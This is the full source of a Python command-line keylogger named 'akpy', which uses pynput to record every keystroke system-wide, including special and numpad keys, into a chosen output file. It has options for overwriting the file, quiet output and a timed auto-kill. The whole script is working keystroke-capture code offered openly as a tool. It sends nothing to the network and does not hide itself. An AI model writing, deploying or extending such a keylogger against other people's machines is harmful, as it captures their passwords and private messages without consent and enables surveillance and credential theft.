#!/usr/bin/env python3
import multiprocessing
import argparse
import time

from pynput import keyboard


__version__ = '0.1.0'


def arg_parser():
    parser = argparse.ArgumentParser(
        prog="akpy",
        description="Another Keylogger. Python.",
    )
    parser.add_argument('-o', '--output',
                        help="output file name")
    parser.add_argument('-w', '--overwrite',
                        help="overwrites the file, if it does exist", action="store_true")
    parser.add_argument('-q', '--quiet',
                        help="less verbose output", action="store_true")
    parser.add_argument('-k', '--kill',
                        help="kills the program after specified time (seconds)", metavar="S")
    parser.add_argument('--version', help="shows the version number",
                        action="version", version='%(prog)s v{version}'.format(version=__version__))
    args = parser.parse_args()
    return args
args = arg_parser()
opt = 'w' if args.overwrite else 'x'


def throw_err(msg):
    print('\033[91m\033[1m' + msg + '\033[0m')
    print('\033[1mIf you need help try -h.\033[0m')
    exit(1)


def file_parser(file, key_event):
    if str(key_event).startswith('Release'):
        pass
    elif key_event.key == keyboard.Key.space:
        file.write(' ')
    elif key_event.key == keyboard.Key.enter:
        file.write('\n')
    elif str(key_event.key).startswith('Key'):
        file.write(
            "[" + str(key_event.key).split(".")[1].upper() + "]")
    elif str(key_event.key).startswith('<'):
        signal_number = int(
            str(key_event.key).split('<')[1].split('>')[0])
        numpad_number = signal_number - 96
        key = '[NumPad' + str(numpad_number) + \
            ']' if numpad_number != 14 else '.'
        content = str(
            numpad_number) if args.quiet else key
        file.write(content)
    else:
        file.write(str(key_event.key).split("'")[1])


def file_validator():
    try:
        open(args.output, opt)
    except FileExistsError:
        throw_err('File exists! specify -w to overwrite.')
    except TypeError:
        throw_err(
            'Invalid output argument! You should specify a file path after -o.')
    except FileNotFoundError:
        pass


def main():
    with keyboard.Events() as events:
        with open(args.output, opt) as file:
            for event in events:
                file_parser(file, event)


if __name__ == '__main__':
    file_validator()
    try:
        if args.kill:
            process = multiprocessing.Process(target=main, name="Main")
            print('\033[90m\033[1mRunning...\033[0m')
            process.start()
            time.sleep(float(args.kill))
            process.terminate()
            process.join()
        else:
            print('\033[90m\033[1mRunning...\033[0m')
            main()
    except KeyboardInterrupt:
        throw_err('Program Terminated\033[0m')
